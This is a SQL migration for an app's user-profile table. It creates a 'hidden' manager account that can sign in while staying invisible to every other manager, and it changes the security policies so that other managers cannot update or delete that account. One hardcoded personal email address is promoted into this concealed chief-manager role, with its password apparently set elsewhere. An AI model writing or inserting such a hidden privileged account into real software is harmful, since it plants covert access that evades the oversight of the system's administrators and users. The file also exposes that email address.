-- Hidden primary manager: a manager account that can sign in, but is not
-- visible to anyone else in lists, reports, or joins.

ALTER TABLE profiles
  ADD COLUMN IF NOT EXISTS hidden boolean NOT NULL DEFAULT false;

-- Other users (including other managers) cannot see hidden profiles.
-- The hidden manager can still read/update their own row (auth.uid() = id).
DROP POLICY IF EXISTS "profile_self_read" ON profiles;
CREATE POLICY "profile_self_read" ON profiles FOR SELECT TO authenticated
  USING (
    auth.uid() = id
    OR (public.is_manager() AND COALESCE(hidden, false) = false)
  );

DROP POLICY IF EXISTS "profile_self_update" ON profiles;
CREATE POLICY "profile_self_update" ON profiles FOR UPDATE TO authenticated
  USING (
    auth.uid() = id
    OR (public.is_manager() AND COALESCE(hidden, false) = false)
  )
  WITH CHECK (
    auth.uid() = id
    OR (public.is_manager() AND COALESCE(hidden, false) = false)
  );

DROP POLICY IF EXISTS "profile_delete_manager" ON profiles;
CREATE POLICY "profile_delete_manager" ON profiles FOR DELETE TO authenticated
  USING (public.is_manager() AND COALESCE(hidden, false) = false);

CREATE INDEX IF NOT EXISTS idx_profiles_hidden ON profiles (hidden);

-- If this login already exists, hide it immediately (password is set by the edge function).
UPDATE profiles p
SET hidden = true,
    role = 'manager',
    full_name = 'מנהל ראשי',
    employee_number = NULL,
    status = 'active'
FROM auth.users u
WHERE p.id = u.id
  AND lower(u.email) = 'e0583296967@gmail.com';
